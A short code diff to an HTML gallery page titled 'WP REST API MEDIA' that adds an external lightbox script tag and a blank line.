@@ -3,6 +3,8 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://fgp.one/lightbox.js" defer></script>
+
     <title>WP REST API MEDIA</title>
     <style>
       body {
@@ -35,6 +37,7 @@
     </style>
   </head>
   <body>
+    
     <h1>WP REST API MEDIA</h1>
     <div class="img-container mansonry"></div>
     <script>
